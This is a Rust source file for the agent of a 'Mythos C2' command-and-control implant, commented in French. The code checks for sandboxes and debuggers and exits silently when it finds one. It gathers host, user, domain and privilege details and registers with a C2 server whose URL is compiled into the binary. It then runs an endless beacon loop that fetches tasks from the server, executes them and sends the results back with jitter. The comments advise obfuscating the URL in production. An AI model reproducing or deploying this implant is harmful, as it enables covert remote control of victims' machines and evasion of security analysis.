// Mythos C2 — Agent
//
// Point d'entrée de l'implant. Ce fichier orchestre :
//   1. Vérifications anti-sandbox au démarrage
//   2. Collecte des informations système
//   3. Enregistrement sur le serveur C2 (handshake ECDH)
//   4. Beacon loop : check-in → exécution des tâches → envoi des résultats
//
// L'URL du C2 est embarquée à la compilation via une variable d'environnement.
// En production : obfusquer l'URL avec ObfString.

mod crypto;
mod transport;
mod evasion;
mod commands;

use transport::{BeaconData, RegisterRequest, Session};
use evasion::check_environment;

// ─────────────────────────────────────────────────────────────
// Configuration compilée dans le binaire
// ─────────────────────────────────────────────────────────────

// URL du C2 — injectée à la compilation
// Usage : C2_URL=https://192.168.249.100:8080 cargo build --release
const C2_URL: &str = env!("C2_URL", "http://192.168.249.100:8080");

// Intervalle beacon par défaut (override par le serveur)
const DEFAULT_SLEEP: u64 = 60;

fn main() {
    // ── 1. Anti-sandbox ─────────────────────────────────────
    // Si on détecte un environnement d'analyse, on sort silencieusement.
    // Aucun message d'erreur — l'agent disparaît sans trace.
    let env_check = check_environment();
    if env_check.is_sandbox || env_check.is_debugged {
        // Sortie silencieuse — pas de panic, pas de message
        std::process::exit(0);
    }

    // ── 2. Collecte des infos système ───────────────────────
    let sysinfo = collect_sysinfo();

    // ── 3. Enregistrement sur le C2 ─────────────────────────
    // Retry loop — si le serveur est down, on réessaie avec backoff
    let mut session = loop {
        match Session::register(C2_URL, &sysinfo) {
            Ok(s) => break s,
            Err(_e) => {
                // Attendre 30 secondes avant de réessayer
                // En production : backoff exponentiel
                std::thread::sleep(std::time::Duration::from_secs(30));
            }
        }
    };

    // ── 4. Beacon loop ──────────────────────────────────────
    // L'agent tourne indéfiniment jusqu'à recevoir un Kill ou une erreur fatale.
    beacon_loop(&mut session);
}

/// beacon_loop — boucle principale de l'agent
///
/// Toutes les N secondes (avec jitter) :
///   1. Envoyer un beacon au serveur
///   2. Récupérer les tâches en attente
///   3. Exécuter chaque tâche dans l'ordre
///   4. Envoyer les résultats
///   5. Dormir jusqu'au prochain check-in
fn beacon_loop(session: &mut Session) {
    loop {
        // Construire le beacon (infos de santé de l'agent)
        let beacon = BeaconData {
            id: session.agent_id.clone(),
            h:  hostname(),
            u:  username(),
            p:  std::process::id(),
            a:  is_admin(),
            i:  integrity_level(),
            ip: local_ip(),
        };

        // Check-in
        match session.beacon(&beacon) {
            Ok(response) => {
                // Ordre de kill reçu → sortie propre
                if response.kill {
                    std::process::exit(0);
                }

                // Mettre à jour les paramètres de sleep
                if response.sleep > 0 {
                    session.sleep = response.sleep;
                    session.jitter = response.jitter;
                }

                // Exécuter les tâches reçues
                for task in &response.tasks {
                    let result = commands::execute(task, &session.agent_id);

                    // Envoyer le résultat (fire and forget si erreur)
                    let _ = session.send_result(&result);
                }
            }
            Err(e) if e.contains("UNAUTHORIZED") => {
                // Clé de session expirée → re-enregistrement
                let sysinfo = collect_sysinfo();
                if let Ok(new_session) = Session::register(C2_URL, &sysinfo) {
                    *session = new_session;
                }
            }
            Err(_) => {
                // Erreur réseau → on réessaie au prochain cycle
            }
        }

        // Attendre avant le prochain check-in (avec jitter)
        session.sleep_with_jitter();
    }
}

// ─────────────────────────────────────────────────────────────
// Collecte d'informations système
// ─────────────────────────────────────────────────────────────

fn collect_sysinfo() -> RegisterRequest {
    RegisterRequest {
        pk: String::new(), // Rempli par Session::register()
        h:  hostname(),
        o:  os_name(),
        a:  arch(),
        u:  username(),
        p:  std::process::id(),
        ia: is_admin(),
        i:  integrity_level(),
        d:  domain(),
    }
}

fn hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".into())
}

fn username() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown".into())
}

fn domain() -> String {
    std::env::var("USERDOMAIN")
        .unwrap_or_else(|_| "WORKGROUP".into())
}

fn os_name() -> String {
    #[cfg(target_os = "windows")]
    return "Windows".into();
    #[cfg(target_os = "linux")]
    return "Linux".into();
    #[cfg(target_os = "macos")]
    return "macOS".into();
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    return "Unknown".into();
}

fn arch() -> String {
    #[cfg(target_arch = "x86_64")]
    return "x64".into();
    #[cfg(target_arch = "x86")]
    return "x86".into();
    #[cfg(target_arch = "aarch64")]
    return "arm64".into();
    #[cfg(not(any(target_arch = "x86_64", target_arch = "x86", target_arch = "aarch64")))]
    return "unknown".into();
}

fn local_ip() -> String {
    // Simplification — en vrai on lirait les interfaces réseau
    "127.0.0.1".into()
}

fn is_admin() -> bool {
    #[cfg(target_os = "windows")]
    {
        // Sur Windows : IsUserAnAdmin() ou vérifier le token
        // Placeholder — implémentation complète avec winapi
        false
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Sur Linux/Mac : uid == 0
        unsafe { libc::getuid() == 0 }
    }
}

fn integrity_level() -> String {
    if is_admin() {
        "High".into()
    } else {
        "Medium".into()
    }
}
